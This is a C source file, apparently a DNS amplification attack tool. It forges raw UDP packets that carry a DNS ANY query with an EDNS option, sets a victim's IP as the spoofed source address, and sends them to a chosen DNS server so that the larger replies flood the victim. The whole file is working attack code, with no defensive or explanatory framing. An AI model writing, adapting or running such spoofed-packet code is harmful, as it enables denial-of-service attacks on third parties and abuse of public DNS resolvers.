#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/time.h>
#include <time.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <unistd.h>

#define URL1 "www.google.com"
#define URL2 "www.amazon.com"
#define URL3 "ieee.org"
#define URL4 "us.org"
typedef struct iphdr iphdr;
typedef struct udphdr udphdr;

void dns_send(char *, int, char *, int);
void dns_format(unsigned char *, unsigned char *);
unsigned short csum(unsigned short *, int);

// DNS header struct
typedef struct
{
	unsigned short id; 		// ID
	unsigned short flags;	// DNS Flags
	unsigned short qcount;	// Question Count
	unsigned short ans;		// Answer Count
	unsigned short auth;	// Authority RR
	unsigned short add;		// Additional RR
}dnshdr;

// Question types
typedef struct
{
	unsigned short qtype;
	unsigned short qclass;
}query;

// ext
typedef struct
{
    unsigned char name;
    unsigned short opt;
    unsigned short size;
    unsigned char rcode;
    unsigned char version;
    unsigned short z;
    unsigned short length;
    unsigned short opcode;
    unsigned short oplength;
    unsigned char cookie[8];
}ext;

int main(int argc, char **argv){
    /* check all setting are done */
	if(getuid()!=0 || argc < 4){
        printf("sudo %s <Target IP> <TARGET PORT> <DNS IP>", argv[1]);
        return 0;
    }
    char *target_ip = argv[1], *dns_ip = argv[3];
    int target_port = atoi(argv[2]), dns_port = 53;
    int i=0;
    for(i=0; i<3; i++){
        dns_send(target_ip, target_port, dns_ip, 53);
    }
}
   
void dns_send(char *target_ip, int target_port, char *dns_ip, int dns_port){ 
    /* create socket */
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(dns_port);
    sin.sin_addr.s_addr = inet_addr(dns_ip);

    /* start fabricating headers */
    // whole packet
    unsigned char packet[4096];
    memset(packet, 0, 4096);
    iphdr *ip = (iphdr *)packet; // ip header struct
    udphdr *udp = (udphdr *)(packet + sizeof(iphdr)); // udp header struct
    unsigned char dns_data[128]; // dns data(header + content)
    // dns
    dnshdr *dns = (dnshdr *)&dns_data;
    dns->id = (unsigned short) htons(0x6652);
    dns->flags = 0x2001;
    dns->qcount = htons(1);
    dns->ans = 0;
    dns->auth = 0;
    dns->add = 0x0100;

    unsigned char *dns_name, url[32];
    dns_name = (unsigned char *)&dns_data[sizeof(dnshdr)];
    strcpy(url, URL4);
    dns_format(dns_name, url);

    query *q = (query *)&dns_data[sizeof(dnshdr) + strlen(dns_name) + 1];
    q->qtype = htons(0xff); //28: AAAA
    q->qclass = htons(1);
    ext *e = (ext *)&dns_data[sizeof(dnshdr) + strlen(dns_name) + 1 + sizeof(query)]; 
    e->name = 0;
    e->opt = 0x1029;
    e->size = 0;
    e->rcode = 0;
    e->version = 0;
    e->z = 0;
    e->length = 12;
    e->opcode = 10;
    e->oplength = 8;

    char *data = packet + sizeof(iphdr) + sizeof(udphdr);
    memcpy(data, &dns_data, sizeof(dnshdr) + strlen(dns_name) + 1 + sizeof(query) + sizeof(ext));
    // ip header
    ip->ihl = 5;
    ip->version = 4;
    ip->tos = 0;
    ip->id = htonl(getpid());
    ip->frag_off = 0;
    ip->protocol = IPPROTO_UDP;
    ip->ttl = 128;
    ip->saddr = inet_addr(target_ip);
    ip->daddr = sin.sin_addr.s_addr;
    ip->tot_len = sizeof(iphdr) + sizeof(udphdr) + sizeof(dnshdr) + (strlen(dns_name) + 1) + sizeof(query) + sizeof(ext);
    ip->check = csum((unsigned short *)packet, ip->tot_len);
    // udp header
    udp->source = htons(target_port);
    udp->dest = htons(dns_port);
    udp->len = htons(ip->tot_len - sizeof(iphdr));
    udp->check = 0;

    /* send packet */
    int sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if(sd != -1) sendto(sd, packet, ip->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));
    else printf("Could not create socket");
    close(sd);
    return;
}

void dns_format(unsigned char * dns,unsigned char * host) {
	int lock = 0 , i;
	strcat((char*)host,".");
	for(i = 0 ; i < strlen((char*)host) ; i++) 
	{
		if(host[i]=='.') 
		{
			*dns++ = i-lock;
			for(;lock<i;lock++) 
			{
				*dns++=host[lock];
			}
			lock++;
		}
	}
	*dns++=0x00;
}

unsigned short csum(unsigned short *ptr,int nbytes){
	register long sum;
	unsigned short oddbyte;
	register short answer;

	sum=0;
	while(nbytes>1) {
		sum+=*ptr++;
		nbytes-=2;
	}
	if(nbytes==1) {
		oddbyte=0;
		*((unsigned char *)&oddbyte)=*(unsigned char *)ptr;
		sum+=oddbyte;
	}

	sum = (sum>>16)+(sum & 0xffff);
	sum = sum + (sum>>16);
	answer=(short)~sum;
	
	return(answer);
}
